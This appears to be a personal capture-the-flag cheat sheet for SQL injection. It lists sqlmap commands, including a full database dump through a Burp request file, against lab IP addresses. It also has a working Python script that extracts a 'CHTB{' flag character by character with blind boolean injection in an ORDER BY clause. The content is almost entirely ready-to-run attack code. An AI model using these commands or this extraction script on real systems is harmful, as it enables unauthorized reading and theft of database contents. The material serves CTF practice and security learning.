# SQLMAP
## Doc
http://manpages.org/sqlmap
-r REQUESTFILE

## Example
```bash
# Get calls
sqlmap -u http://10.10.121.12/?username=a&password=a&x=29&y=4

# Use a request inside a file. Support format of BURP repeater, very useful for POST
sqlmap -r request_login.txt

# Dump, excluding system databases of the RDBMS
sqlmap -r request.txt -a --exclude-sysdbs | tee sqlmap.res
```

# Starts with
```python
import requests
import string

# We are sure that password is the flag which starts with "TWCTF{"
# and ends with "}"

flag = "CHTB{"
url = "http://138.68.151.248:32634/api/list"

# Each time a 302 redirect is seen, we should restart the loop

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.ascii_letters + string.digits + "!@#$^()@_{}":
        payload = flag + i
        print(payload)
        post_data = {"order": "(CASE WHEN (SELECT count(1) FROM flag_14389ed139 WHERE flag LIKE '%s%s')=1 THEN id ELSE count END) DESC" % (payload, '%')}
        r = requests.post(url, json=post_data)

        # A correct password means we get This millitary staff member exists.
        if r.json()[1].get('id') == 11:
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid redirect

            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break
```